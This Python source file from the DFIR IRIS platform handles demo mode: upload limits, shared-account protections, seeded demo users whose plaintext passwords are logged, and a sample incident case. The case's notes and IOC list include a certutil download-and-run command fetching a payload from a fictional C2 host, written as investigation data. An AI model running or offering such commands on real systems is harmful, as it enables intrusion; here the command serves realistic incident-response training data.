#  IRIS Source Code
#  DFIR IRIS
#  contact@dfir-iris.org
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU Lesser General Public
#  License as published by the Free Software Foundation; either
#  version 3 of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
#  Lesser General Public License for more details.
#
#  You should have received a copy of the GNU Lesser General Public License
#  along with this program; if not, write to the Free Software Foundation,
#  Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import datetime
import random
import string

from app import app
from app import bc
from app.business.customers import customers_get_by_name, customers_create
from app.datamgmt.case.case_assets_db import create_asset
from app.datamgmt.case.case_db import case_db_save
from app.datamgmt.case.case_events_db import update_event_assets, update_event_iocs
from app.datamgmt.case.case_iocs_db import add_ioc, get_ioc_types_list, get_ioc_by_value
from app.datamgmt.case.case_notes_db import add_note, add_note_group
from app.db import db
from app.blueprints.iris_user import iris_current_user
from app.datamgmt.manage.manage_groups_db import add_case_access_to_group
from app.datamgmt.manage.manage_users_db import add_user_to_group
from app.datamgmt.manage.manage_users_db import add_user_to_organisation
from app.datamgmt.manage.manage_users_db import user_exists
from app.iris_engine.access_control.utils import ac_add_users_multi_effective_access
from app.models.alerts import Alert, Severity, AlertStatus
from app.models.assets import CaseAssets, AssetsType, CompromiseStatus, AnalysisStatus
from app.models.cases import Cases, CasesEvent
from app.models.errors import ObjectNotFoundError
from app.models.customers import Client
from app.models.authorization import CaseAccessLevel
from app.models.authorization import User
from app.models.iocs import Ioc
from app.models.models import CaseEventsAssets, CaseEventsIoc, EventCategory, CaseEventCategory, IocType

log = app.logger


# Per-file upload ceiling. Started life as a datastore-only guard and
# now applies to every upload surface (datastore, war-room datastore
# and chat attachments, avatars, report templates, asset-type icons,
# case and managed-asset imports). `MAX_CONTENT_LENGTH` in
# `app.configuration` caps the whole request on top of this.
DEMO_MODE_UPLOAD_MAX_BYTES = 10 * 1024

# The account that owns a demo instance. Everything an operator needs
# to keep the demo running (server settings, backups, SMTP probe) stays
# reachable for this user and nobody else — see
# `demo_mode_restricts_server_settings`.
DEMO_MODE_OWNER_USER_ID = 1


def is_demo_mode_enabled():
    return app.config.get('DEMO_MODE_ENABLED') == 'True'


def demo_mode_blocks_password_change():
    """True when demo mode forbids setting a password — for any account.

    The demo publishes its credentials on the landing page, so a
    visitor changing *any* password (their own, another account's, via
    the admin user editor) locks the next visitor out of that account.
    Unlike `protect_demo_mode_user` this is not scoped to the seeded
    accounts: an account created during a demo session is just as
    shared as a seeded one.
    """
    return is_demo_mode_enabled()


def demo_mode_blocks_mfa():
    """True when demo mode forbids MFA entirely.

    Demo accounts are shared, so a second factor bound to one visitor's
    authenticator app locks out everyone else. Demo mode therefore
    forces the server-wide policy off (`enforce_mfa` is ignored, see
    `app.business.auth`), refuses enrolment, and refuses admin resets —
    there is nothing to reset.
    """
    return is_demo_mode_enabled()


def demo_mode_restricts_server_settings():
    """True when the *caller* must not reach the server-settings surface.

    Server settings carry SMTP credentials, DSNs, the chatbot API key
    and the backup trigger. On a demo instance every visitor is an
    admin, so `server_administrator` alone is not a meaningful gate;
    the surface is narrowed to `DEMO_MODE_OWNER_USER_ID`.
    """
    if not is_demo_mode_enabled():
        return False
    return getattr(iris_current_user, 'id', None) != DEMO_MODE_OWNER_USER_ID


def demo_mode_over_upload_cap(file_storage):
    """Return True when demo mode is on and the pending upload exceeds
    `DEMO_MODE_UPLOAD_MAX_BYTES` (10 KB).

    The size is read from the underlying stream by seeking to end and
    then rewinding. `FileStorage.content_length` is only populated when
    the client sent a per-part Content-Length header (rare), so relying
    on it would let large uploads slip past the cap.
    """
    if not is_demo_mode_enabled():
        return False
    if file_storage is None:
        return False
    stream = file_storage.stream
    try:
        stream.seek(0, 2)
        size = stream.tell()
    finally:
        stream.seek(0)
    return size > DEMO_MODE_UPLOAD_MAX_BYTES


def demo_mode_upload_cap_message():
    """Single wording for the over-cap rejection, used by every upload route."""
    return (f'Uploads are limited to {DEMO_MODE_UPLOAD_MAX_BYTES // 1024} KB '
            f'in demo mode')


def protect_demo_mode_user(user):
    if not is_demo_mode_enabled():
        return False

    users_p = [f'user_std_{i}' for i in range(1, int(app.config.get('DEMO_USERS_COUNT', 10)))]
    users_p += [f'adm_{i}' for i in range(1, int(app.config.get('DEMO_ADM_COUNT', 4)))]

    if iris_current_user.id != 1 and user.id == 1:
        return True

    if user.user in users_p:
        return True

    return False


def protect_demo_mode_group(group):
    if not is_demo_mode_enabled():
        return False

    if iris_current_user.id != 1 and group.group_id in [1, 2]:
        return True

    return False


def gen_demo_admins(count, seed_adm):
    random.seed(seed_adm, version=2)
    for i in range(1, count):
        yield f'Adm {i}',\
              f'adm_{i}', \
              ''.join(random.choices(string.printable[:-6], k=16)), \
              ''.join(random.choices(string.ascii_letters, k=64))


def gen_demo_users(count, seed_user):
    random.seed(seed_user, version=2)
    for i in range(1, count):
        yield f'User Std {i}',\
              f'user_std_{i}', \
              ''.join(random.choices(string.printable[:-6], k=16)), \
              ''.join(random.choices(string.ascii_letters, k=64))


def create_demo_users(def_org, gadm, ganalystes, users_count, seed_user, adm_count, seed_adm):
    users = {
        'admins': [],
        'users': [],
        'gadm': gadm,
        'ganalystes': ganalystes
    }

    for name, username, pwd, api_key in gen_demo_users(users_count, seed_user):

        # Create default users
        user = user_exists(username, f'{username}@iris.local')
        if not user:
            password = bc.generate_password_hash(pwd.encode('utf-8')).decode('utf-8')
            user = User(
                user=username,
                password=password,
                email=f'{username}@iris.local',
                name=name,
                active=True)

            user.api_key = api_key
            db.session.add(user)
            db.session.commit()
            add_user_to_group(user_id=user.id, group_id=ganalystes.group_id)
            add_user_to_organisation(user_id=user.id, org_id=def_org.org_id)
            db.session.commit()
            log.info(f'Created demo user: {user.user} -  {pwd}')

        users['users'].append(user)

    for name, username, pwd, api_key in gen_demo_admins(adm_count, seed_adm):
        user = user_exists(username, f'{username}@iris.local')
        if not user:
            password = bc.generate_password_hash(pwd.encode('utf-8')).decode('utf-8')
            user = User(
                user=username,
                password=password,
                email=f'{username}@iris.local',
                name=name,
                active=True)

            user.api_key = api_key
            db.session.add(user)
            db.session.commit()
            add_user_to_group(user_id=user.id, group_id=gadm.group_id)
            add_user_to_organisation(user_id=user.id, org_id=def_org.org_id)
            db.session.commit()
            log.info(f'Created demo admin: {user.user} - {pwd}')

        users['admins'].append(user)

    return users


def safe_create_customer(name, description):
    try:
        return customers_get_by_name(name)
    except ObjectNotFoundError:
        customer = Client(name=name, description=description)
        customers_create(customer)
        return customer


_DEMO_ALERT_TITLES = [
    "Suspicious PowerShell execution detected",
    "Possible lateral movement via SMB",
    "Brute force attempt on VPN gateway",
    "Anomalous DNS queries to uncommon TLD",
    "Potential data exfiltration over HTTPS",
    "Privilege escalation attempt via scheduled task",
    "Malicious macro document opened by user",
    "Outbound connection to known C2 IP range",
    "Credential dumping activity detected",
    "Suspicious registry modification",
    "Ransomware-like file encryption behavior",
    "Unexpected LSASS memory access",
    "SQL injection attempt on web application",
    "Phishing link clicked by end user",
    "Unauthorized SSH login from external IP",
    "Beacon-like periodic outbound connections",
    "Pass-the-hash attack pattern observed",
    "RDP brute force from external source",
    "Suspicious WMI persistence mechanism",
    "Large archive file created and transferred",
]

_DEMO_ALERT_SOURCES = [
    "SIEM", "EDR", "IDS/IPS", "Firewall", "Email Gateway",
    "Proxy", "Cloud Security", "Vulnerability Scanner", "Threat Intel Feed", "UEBA",
]

_DEMO_ASSET_NAMES = [
    ("WS-FINANCE-01", "Windows - Computer", "10.0.1.10", "CORP"),
    ("WS-HR-07", "Windows - Computer", "10.0.1.17", "CORP"),
    ("SRV-DC-01", "Windows - DC", "10.0.0.1", "CORP"),
    ("SRV-FILE-02", "Windows - Server", "10.0.0.12", "CORP"),
    ("SRV-WEB-PROD", "Linux - Server", "10.0.2.5", "DMZ"),
    ("SRV-DB-MYSQL", "Linux - Server", "10.0.2.8", "DMZ"),
    ("WS-DEV-03", "Windows - Computer", "10.0.3.21", "DEV"),
    ("LAPTOP-EXEC-02", "Windows - Computer", "10.0.1.55", "CORP"),
    ("GW-FIREWALL", "Firewall", "192.168.1.1", ""),
    ("VPN-GATEWAY", "VPN", "203.0.113.10", ""),
    ("jdoe", "Windows Account - AD", "", "CORP"),
    ("svc_backup", "Windows Account - AD - Service", "", "CORP"),
    ("Administrator", "Windows Account - Local - Admin", "10.0.0.1", "CORP"),
    ("krbtgt", "Windows Account - AD - krbtgt", "", "CORP"),
]

_DEMO_IOCS = [
    ("domain", "update-service-cdn.net", "Suspicious C2 domain used for beacon callbacks"),
    ("domain", "telemetry-patch-ms.com", "Lookalike domain mimicking Microsoft telemetry"),
    ("ip-dst", "198.51.100.47", "Known C2 IP address observed in threat intel feed"),
    ("ip-dst", "203.0.113.88", "IP associated with data exfiltration destination"),
    ("ip-src", "10.0.1.17", "Internal host exhibiting lateral movement behavior"),
    ("url", "http://update-service-cdn.net/stage2.bin", "Stage 2 payload download URL"),
    ("md5", "d41d8cd98f00b204e9800998ecf8427e", "Hash of dropped malicious DLL"),
    ("sha256", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
     "Hash of obfuscated PowerShell dropper"),
    ("email-src", "invoice-update@mail-noreply-corp.net", "Phishing email sender address"),
    ("filename", "invoice_Q4_2024.xlsm", "Malicious macro-enabled document used in initial access"),
    ("filename", "svchost32.exe", "Masqueraded executable dropped in Temp directory"),
    ("regkey", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\updater",
     "Persistence registry key added by malware"),
    ("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
     "Outdated user-agent string used by implant HTTP calls"),
]

_DEMO_NOTE_GROUPS = [
    ("Initial Analysis", [
        ("Triage Summary",
         "## Triage Summary\n\n**Analyst:** Initial responder\n\n"
         "Alert triaged and confirmed as true positive. Malicious macro document delivered "
         "via spear-phishing email. User opened the attachment and enabled macros, triggering "
         "a PowerShell cradle that downloaded a second-stage payload.\n\n"
         "**Priority:** High\n**Containment required:** Yes"),
        ("Affected Systems",
         "## Affected Systems\n\n| Hostname | IP | Domain | Status |\n"
         "|---|---|---|---|\n"
         "| WS-FINANCE-01 | 10.0.1.10 | CORP | Isolated |\n"
         "| SRV-FILE-02 | 10.0.0.12 | CORP | Monitoring |\n\n"
         "Domain controller SRV-DC-01 accessed via lateral movement — "
         "event logs reviewed, no evidence of persistence at this time."),
    ]),
    ("Investigation", [
        ("Execution Chain",
         "## Execution Chain\n\n```\nOUTLOOK.EXE\n  └─ EXCEL.EXE (invoice_Q4_2024.xlsm)\n"
         "       └─ powershell.exe -enc <base64>\n"
         "            └─ cmd.exe /c certutil -urlcache -f http://update-service-cdn.net/stage2.bin "
         "C:\\Users\\Public\\svchost32.exe\n"
         "                 └─ svchost32.exe (implant)\n```\n\n"
         "Implant established a persistent scheduled task under the current user context."),
        ("Network Activity",
         "## Network Activity\n\n"
         "Beacon pattern observed every ~240 seconds to **198.51.100.47:443**.\n\n"
         "DNS queries to `update-service-cdn.net` starting at T+00:03 after document open.\n\n"
         "Single large outbound HTTPS transfer (~48 MB) to 203.0.113.88 observed at T+02:14 — "
         "likely data staging/exfiltration."),
        ("Credential Access",
         "## Credential Access\n\nLSASS memory read detected on WS-FINANCE-01 at T+00:47. "
         "Credential material likely harvested for `jdoe` and `svc_backup` accounts.\n\n"
         "Pass-the-hash attempt observed from WS-FINANCE-01 targeting SRV-DC-01 (event ID 4624 logon type 3 "
         "with NTLMv2). Recommend immediate password reset for both accounts."),
    ]),
    ("Remediation", [
        ("Containment Steps",
         "## Containment Steps\n\n- [x] Isolated WS-FINANCE-01 from network\n"
         "- [x] Blocked 198.51.100.47 and 203.0.113.88 at perimeter firewall\n"
         "- [x] Blocked domain `update-service-cdn.net` at DNS sinkholes\n"
         "- [ ] Reset credentials for jdoe and svc_backup\n"
         "- [ ] Review all logon events for svc_backup account in last 30 days\n"
         "- [ ] Scan all hosts in CORP subnet for svchost32.exe IOC"),
        ("Lessons Learned",
         "## Lessons Learned\n\n"
         "1. Macro execution was enabled by user despite policy — review GPO enforcement.\n"
         "2. EDR alert fired 4 minutes after execution — validate alert tuning and escalation SLA.\n"
         "3. No email gateway block on the phishing domain — domain was registered 6 hours prior to delivery.\n"
         "4. Consider deploying decoy credentials to detect credential theft earlier."),
    ]),
]

_DEMO_TIMELINE_EVENTS = [
    (datetime.timedelta(minutes=0), "Phishing email received by jdoe",
     "Email with subject 'Invoice Q4 2024' received from invoice-update@mail-noreply-corp.net. "
     "Attachment: invoice_Q4_2024.xlsm.",
     "Email Gateway", "#FFD700", False, True),
    (datetime.timedelta(minutes=3), "Malicious document opened",
     "User jdoe opened invoice_Q4_2024.xlsm in Excel and clicked 'Enable Content'. "
     "Macros executed immediately.",
     "EDR", "#FF8C00", False, True),
    (datetime.timedelta(minutes=3, seconds=12), "PowerShell cradle launched",
     "EXCEL.EXE spawned powershell.exe with base64-encoded command. "
     "Command decoded to certutil download of stage2.bin.",
     "EDR", "#FF4500", True, True),
    (datetime.timedelta(minutes=3, seconds=41), "Stage 2 payload downloaded",
     "certutil.exe downloaded http://update-service-cdn.net/stage2.bin "
     "to C:\\Users\\Public\\svchost32.exe.",
     "Proxy", "#FF4500", True, True),
    (datetime.timedelta(minutes=4, seconds=5), "Implant executed",
     "svchost32.exe spawned from cmd.exe. Process established outbound TLS connection.",
     "EDR", "#FF0000", True, True),
    (datetime.timedelta(minutes=4, seconds=9), "C2 beacon established",
     "First beacon to 198.51.100.47:443 observed. JA3 fingerprint matches known Cobalt Strike profile.",
     "IDS/IPS", "#FF0000", True, True),
    (datetime.timedelta(minutes=7), "Scheduled task created for persistence",
     r"Scheduled task 'updater' created under HKCU\...\Run pointing to svchost32.exe.",
     "EDR", "#FF4500", True, False),
    (datetime.timedelta(minutes=47), "LSASS memory access",
     "svchost32.exe opened a handle to lsass.exe with PROCESS_VM_READ. "
     "Credential harvesting likely at this point.",
     "EDR", "#FF0000", True, True),
    (datetime.timedelta(minutes=51), "Lateral movement attempt to SRV-DC-01",
     "SMB connection from WS-FINANCE-01 to SRV-DC-01 using NTLMv2 hash. "
     "Logon type 3 — network logon. Event ID 4624.",
     "SIEM", "#FF4500", True, True),
    (datetime.timedelta(hours=2, minutes=14), "Data exfiltration",
     "~48 MB HTTPS POST to 203.0.113.88. Consistent with staged archive upload. "
     "File activity prior to transfer shows mass reads from SRV-FILE-02 share.",
     "Firewall", "#FF0000", True, True),
    (datetime.timedelta(hours=2, minutes=58), "Alert triaged by SOC",
     "EDR alert reviewed by on-call analyst. Escalated to IR team.",
     "SIEM", "#1E90FF", False, False),
    (datetime.timedelta(hours=3, minutes=10), "Host WS-FINANCE-01 isolated",
     "Network isolation applied via EDR console. Host confirmed offline.",
     "EDR", "#32CD32", False, False),
]


def _get_ioc_type_id(type_name: str):
    ioc_type = IocType.query.filter(IocType.type_name == type_name).first()
    return ioc_type.type_id if ioc_type else None


def _get_asset_type_id(asset_type_name: str):
    at = AssetsType.query.filter(AssetsType.asset_name == asset_type_name).first()
    return at.asset_id if at else None


def _get_severity_id(name: str):
    s = Severity.query.filter(Severity.severity_name == name).first()
    return s.severity_id if s else 1


def _get_alert_status_id(name: str):
    s = AlertStatus.query.filter(AlertStatus.status_name == name).first()
    return s.status_id if s else 1


def _get_event_category_id(name: str):
    cat = EventCategory.query.filter(EventCategory.name == name).first()
    return cat.id if cat else None


def _base_event_time():
    return datetime.datetime(2024, 11, 14, 8, 32, 0)


def _add_demo_iocs(case, user):
    """Create IOCs for a case, return list of created Ioc objects."""
    created = []
    for type_name, value, description in _DEMO_IOCS:
        type_id = _get_ioc_type_id(type_name)
        if type_id is None:
            continue
        existing = get_ioc_by_value(value, caseid=case.case_id)
        if existing:
            created.append(existing)
            continue
        ioc = Ioc()
        ioc.ioc_value = value
        ioc.ioc_type_id = type_id
        ioc.ioc_description = description
        ioc.ioc_tags = "demo"
        ioc.ioc_tlp_id = 2  # TLP:AMBER
        add_ioc(ioc, user.id, case.case_id)
        created.append(ioc)
    return created


def _add_demo_assets(case, user):
    """Create assets for a case, return list of created CaseAssets objects."""
    created = []
    for name, type_name, ip, domain in _DEMO_ASSET_NAMES:
        type_id = _get_asset_type_id(type_name)
        if type_id is None:
            continue
        existing = CaseAssets.query.filter(
            CaseAssets.case_id == case.case_id,
            CaseAssets.asset_name == name,
        ).first()
        if existing:
            created.append(existing)
            continue
        asset = CaseAssets()
        asset.asset_name = name
        asset.asset_description = f"Asset involved in the incident — {type_name}"
        asset.asset_ip = ip
        asset.asset_domain = domain
        asset.asset_type_id = type_id
        asset.asset_compromise_status_id = CompromiseStatus.compromised.value if name in (
            "WS-FINANCE-01", "jdoe", "svc_backup") else CompromiseStatus.unknown.value
        asset.analysis_status_id = 2  # "Started"
        asset.asset_tags = "demo"
        create_asset(asset, case.case_id, user.id)
        created.append(asset)
    return created


def _add_demo_notes(case, user):
    """Create note groups and notes for a case."""
    now = datetime.datetime.utcnow()
    for group_title, notes in _DEMO_NOTE_GROUPS:
        group = add_note_group(group_title, case.case_id, user.id, now)
        for note_title, note_content in notes:
            add_note(note_title, now, user.id, case.case_id,
                     directory_id=None, note_content=note_content)


def _add_demo_timeline(case, user, assets, iocs):
    """Create timeline events linked to relevant assets and IOCs."""
    base_time = _base_event_time()
    asset_map = {a.asset_name: a for a in assets}
    ioc_map = {i.ioc_value: i for i in iocs}

    event_asset_links = [
        # (event_index, [asset_names])
        (0, []),
        (1, ["WS-FINANCE-01", "jdoe"]),
        (2, ["WS-FINANCE-01", "jdoe"]),
        (3, ["WS-FINANCE-01"]),
        (4, ["WS-FINANCE-01"]),
        (5, ["WS-FINANCE-01", "VPN-GATEWAY"]),
        (6, ["WS-FINANCE-01"]),
        (7, ["WS-FINANCE-01", "jdoe"]),
        (8, ["WS-FINANCE-01", "SRV-DC-01", "jdoe"]),
        (9, ["WS-FINANCE-01", "SRV-FILE-02"]),
        (10, []),
        (11, ["WS-FINANCE-01"]),
    ]
    event_ioc_links = [
        (0, ["invoice-update@mail-noreply-corp.net", "invoice_Q4_2024.xlsm"]),
        (1, ["invoice_Q4_2024.xlsm"]),
        (2, ["svchost32.exe"]),
        (3, ["http://update-service-cdn.net/stage2.bin", "update-service-cdn.net", "svchost32.exe"]),
        (4, ["svchost32.exe"]),
        (5, ["198.51.100.47", "update-service-cdn.net"]),
        (6, [r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\updater"]),
        (7, []),
        (8, ["jdoe"]),
        (9, ["203.0.113.88"]),
        (10, []),
        (11, []),
    ]

    for idx, (delta, title, content, source, color, in_graph, in_summary) in enumerate(_DEMO_TIMELINE_EVENTS):
        event_time = base_time + delta
        event = CasesEvent()
        event.case_id = case.case_id
        event.event_title = title
        event.event_content = content
        event.event_source = source
        event.event_date = event_time
        event.event_date_wtz = event_time
        event.event_tz = "+00:00"
        event.event_added = datetime.datetime.utcnow()
        event.event_in_graph = in_graph
        event.event_in_summary = in_summary
        event.event_color = color
        event.event_tags = "demo"
        event.user_id = user.id
        db.session.add(event)
        db.session.flush()

        linked_asset_ids = [
            asset_map[n].asset_id for n in event_asset_links[idx][1]
            if n in asset_map
        ]
        linked_ioc_ids = [
            ioc_map[v].ioc_id for v in event_ioc_links[idx][1]
            if v in ioc_map
        ]
        if linked_asset_ids:
            update_event_assets(event.event_id, case.case_id, linked_asset_ids, linked_ioc_ids, False)
        if linked_ioc_ids:
            update_event_iocs(event.event_id, case.case_id, linked_ioc_ids)

    db.session.commit()


def _add_demo_alerts(case, user, client_id, assets, iocs):
    """Create a set of alerts, some linked to the case."""
    asset_map = {a.asset_name: a for a in assets}
    ioc_map = {i.ioc_value: i for i in iocs}
    base_time = _base_event_time()

    alert_defs = [
        ("Suspicious PowerShell execution detected", "SIEM",
         "High", "Escalated", base_time,
         ["WS-FINANCE-01"], ["svchost32.exe"]),
        ("Malicious macro document opened by user", "EDR",
         "High", "Escalated", base_time - datetime.timedelta(minutes=1),
         ["WS-FINANCE-01", "jdoe"], ["invoice_Q4_2024.xlsm", "invoice-update@mail-noreply-corp.net"]),
        ("Outbound connection to known C2 IP range", "IDS/IPS",
         "Critical", "Escalated", base_time + datetime.timedelta(minutes=4, seconds=9),
         ["WS-FINANCE-01"], ["198.51.100.47", "update-service-cdn.net"]),
        ("Credential dumping activity detected", "EDR",
         "Critical", "Escalated", base_time + datetime.timedelta(minutes=47),
         ["WS-FINANCE-01", "jdoe", "svc_backup"], []),
        ("Potential data exfiltration over HTTPS", "Firewall",
         "High", "Escalated", base_time + datetime.timedelta(hours=2, minutes=14),
         ["WS-FINANCE-01", "SRV-FILE-02"], ["203.0.113.88"]),
        ("Brute force attempt on VPN gateway", "Firewall",
         "Medium", "Closed", base_time - datetime.timedelta(days=3),
         ["VPN-GATEWAY"], []),
        ("Anomalous DNS queries to uncommon TLD", "SIEM",
         "Low", "New", base_time - datetime.timedelta(days=1),
         [], ["update-service-cdn.net", "telemetry-patch-ms.com"]),
        ("Privilege escalation attempt via scheduled task", "EDR",
         "High", "In progress", base_time + datetime.timedelta(minutes=7),
         ["WS-FINANCE-01"], [r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\updater"]),
    ]

    for title, source, severity_name, status_name, event_time, asset_names, ioc_values in alert_defs:
        existing = Alert.query.filter(
            Alert.alert_title == title,
            Alert.alert_customer_id == client_id,
        ).first()
        if existing:
            continue

        alert_assets = [asset_map[n] for n in asset_names if n in asset_map]
        alert_iocs = [ioc_map[v] for v in ioc_values if v in ioc_map]

        alert = Alert()
        alert.alert_title = title
        alert.alert_description = f"Demo alert: {title}"
        alert.alert_source = source
        alert.alert_source_ref = f"DEMO-{random.randint(10000, 99999)}"
        alert.alert_severity_id = _get_severity_id(severity_name)
        alert.alert_status_id = _get_alert_status_id(status_name)
        alert.alert_customer_id = client_id
        alert.alert_source_event_time = event_time
        alert.alert_owner_id = user.id
        alert.alert_tags = "demo"
        alert.iocs = alert_iocs
        alert.assets = alert_assets

        db.session.add(alert)
        db.session.flush()

        from app.models.alerts import AlertCaseAssociation
        if status_name == "Escalated":
            assoc = AlertCaseAssociation(alert_id=alert.alert_id, case_id=case.case_id)
            db.session.add(assoc)

    db.session.commit()


def _populate_case(case, user):
    """Add IOCs, assets, notes, timeline, and alerts to a single case."""
    log.info(f"Populating demo case '{case.name}' with rich data")
    iocs = _add_demo_iocs(case, user)
    db.session.flush()
    assets = _add_demo_assets(case, user)
    db.session.flush()
    _add_demo_notes(case, user)
    _add_demo_timeline(case, user, assets, iocs)
    _add_demo_alerts(case, user, case.client_id, assets, iocs)


def create_demo_cases(users_data: dict = None, cases_count: int = 0, clients_count: int = 0):

    clients = []
    for client_index in range(0, clients_count):
        client = safe_create_customer(f'Client {client_index}', f'Description for client {client_index}')
        clients.append(client.client_id)

    cases_list = []
    for case_index in range(0, cases_count):
        if demo_case_exists(f"Unrestricted Case {case_index}", f"SOC-{case_index}") is not None:
            log.info(f'Restricted case {case_index} already exists')
            continue

        case = Cases(
            name=f"Unrestricted Case {case_index}",
            description="This is a demonstration of an unrestricted case",
            soc_id=f"SOC-{case_index}",
            user=random.choice(users_data['users']),
            client_id=random.choice(clients)
        )

        case_db_save(case)

        db.session.commit()
        cases_list.append(case.case_id)
        log.info(f'Added unrestricted case {case.name}')

        if case_index == 0:
            _populate_case(case, random.choice(users_data['admins']))

    log.info('Setting permissions for unrestricted cases')
    add_case_access_to_group(group=users_data['ganalystes'],
                             cases_list=cases_list,
                             access_level=CaseAccessLevel.full_access.value)

    add_case_access_to_group(group=users_data['gadm'],
                             cases_list=cases_list,
                             access_level=CaseAccessLevel.full_access.value)

    ac_add_users_multi_effective_access(users_list=[u.id for u in users_data['users']],
                                        cases_list=cases_list,
                                        access_level=CaseAccessLevel.full_access.value)

    ac_add_users_multi_effective_access(users_list=[u.id for u in users_data['admins']],
                                        cases_list=cases_list,
                                        access_level=CaseAccessLevel.full_access.value)

    cases_list = []
    for case_index in range(0, int(cases_count / 2)):
        if demo_case_exists(f"Restricted Case {case_index}", f"SOC-RSTRCT-{case_index}") is not None:
            log.info(f'Restricted case {case_index} already exists')
            continue

        case = Cases(
            name=f"Restricted Case {case_index}",
            description="This is a demonstration of a restricted case that shouldn't be visible to analyst",
            soc_id=f"SOC-RSTRCT-{case_index}",
            user=random.choice(users_data['admins']),
            client_id=random.choice(clients)
        )
        case_db_save(case)

        db.session.commit()
        cases_list.append(case.case_id)
        log.info(f'Added restricted case {case.name}')

    add_case_access_to_group(group=users_data['ganalystes'],
                             cases_list=cases_list,
                             access_level=CaseAccessLevel.deny_all.value)

    ac_add_users_multi_effective_access(users_list=[u.id for u in users_data['users']],
                                        cases_list=cases_list,
                                        access_level=CaseAccessLevel.deny_all.value)

    add_case_access_to_group(group=users_data['gadm'],
                             cases_list=cases_list,
                             access_level=CaseAccessLevel.full_access.value)

    ac_add_users_multi_effective_access(users_list=[u.id for u in users_data['admins']],
                                        cases_list=cases_list,
                                        access_level=CaseAccessLevel.full_access.value)

    log.info('Demo data created successfully')


def demo_case_exists(name, soc_id):
    return db.session.query(Cases).filter(Cases.name.like(f'%{name}'),
                                          Cases.soc_id == soc_id).first()
